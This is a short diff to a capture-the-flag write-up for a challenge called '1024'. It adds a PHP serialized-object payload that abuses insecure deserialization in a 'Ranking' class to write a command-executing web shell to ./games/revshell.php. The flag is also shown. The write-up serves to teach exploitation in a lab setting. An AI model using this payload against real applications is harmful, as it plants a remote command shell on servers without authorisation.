@@ -15,7 +15,9 @@ Knowing that we can try to bypass the hash condition, crafting our cookie, and m
 # 1024 ![c](https://img.shields.io/badge/solved-success)
 ### Analysis
 ### Exploit
-
+```
+O:7:"Ranking":3:{s:7:"ranking";s:34:"<?php echo system($_GET['cmd']);?>";s:7:"changed";b:1;s:4:"path";s:20:"./games/revshell.php";}
+```
 ![Alt text](./result_1024.PNG?raw=true "Title")
 
 **flag{never_deserialize_user_input!}**
